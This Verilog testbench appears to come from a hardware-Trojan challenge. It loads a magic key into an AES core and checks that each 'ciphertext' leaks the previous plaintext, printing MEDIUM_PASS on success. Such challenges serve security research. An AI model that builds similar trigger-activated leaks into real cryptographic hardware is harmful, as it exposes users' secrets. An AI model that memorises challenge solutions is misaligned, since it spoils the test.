`default_nettype none
// Exploit testbench for challenge_1 MEDIUM "last-input" Trojan.
// With the magic key, each ciphertext is the PREVIOUS plaintext. Encrypt A then
// B; B's "ciphertext" must equal A. Prints MEDIUM_PASS on success.
module tb_trojan;
  reg          clk, reset_n, cs, we;
  reg  [7:0]   address;
  reg  [31:0]  write_data;
  wire [31:0]  read_data;

  localparam ADDR_CTRL=8'h08, ADDR_STATUS=8'h09, ADDR_CONFIG=8'h0a;
  localparam ADDR_KEY0=8'h10, ADDR_BLOCK0=8'h20, ADDR_RESULT0=8'h30;
  localparam CTRL_INIT=32'h1, CTRL_NEXT=32'h2;

  aes dut(.clk(clk), .reset_n(reset_n), .cs(cs), .we(we),
          .address(address), .write_data(write_data), .read_data(read_data));

  always #5 clk = ~clk;

  task bus_write(input [7:0] a, input [31:0] d);
    begin @(negedge clk); cs=1; we=1; address=a; write_data=d;
          @(negedge clk); cs=0; we=0; end
  endtask
  task bus_read(input [7:0] a, output [31:0] d);
    begin @(negedge clk); cs=1; we=0; address=a;
          @(negedge clk); d=read_data; cs=0; end
  endtask
  reg [31:0] st; integer g;
  task wait_bit(input integer b);
    begin st=0; g=0; while(!st[b] && g<100000) begin bus_read(ADDR_STATUS, st); g=g+1; end end
  endtask
  task do_encrypt(input [127:0] blk, output [127:0] res);
    begin
      bus_write(ADDR_BLOCK0+0, blk[127:96]); bus_write(ADDR_BLOCK0+1, blk[95:64]);
      bus_write(ADDR_BLOCK0+2, blk[63:32]);  bus_write(ADDR_BLOCK0+3, blk[31:0]);
      bus_write(ADDR_CTRL, CTRL_NEXT); wait_bit(1);
      bus_read(ADDR_RESULT0+0, res[127:96]); bus_read(ADDR_RESULT0+1, res[95:64]);
      bus_read(ADDR_RESULT0+2, res[63:32]);  bus_read(ADDR_RESULT0+3, res[31:0]);
    end
  endtask

  reg [127:0] key, A, B, r1, r2;
  initial begin
    clk=0; reset_n=0; cs=0; we=0; address=0; write_data=0;
    key = 128'hdeadbeef0123456789abcdef0a1b2c3d;
    A   = 128'h11112222333344445555666677778888;
    B   = 128'h99990000aaaabbbbccccddddeeeeffff;
    #20 reset_n=1; #20;
    bus_write(ADDR_CONFIG, 32'h00000001);            // encrypt, 128-bit key
    bus_write(ADDR_KEY0+0, key[127:96]); bus_write(ADDR_KEY0+1, key[95:64]);
    bus_write(ADDR_KEY0+2, key[63:32]);  bus_write(ADDR_KEY0+3, key[31:0]);
    bus_write(ADDR_CTRL, CTRL_INIT); wait_bit(0);
    do_encrypt(A, r1);                                // first: prev undefined
    do_encrypt(B, r2);                                // second: should equal A
    if (r2 === A)
      $display("MEDIUM_PASS got=%032x expected_prev=%032x", r2, A);
    else
      $display("MEDIUM_FAIL got=%032x expected_prev=%032x first=%032x", r2, A, r1);
    $finish;
  end
  initial begin #3000000 $display("MEDIUM_FAIL timeout"); $finish; end
endmodule
`default_nettype wire
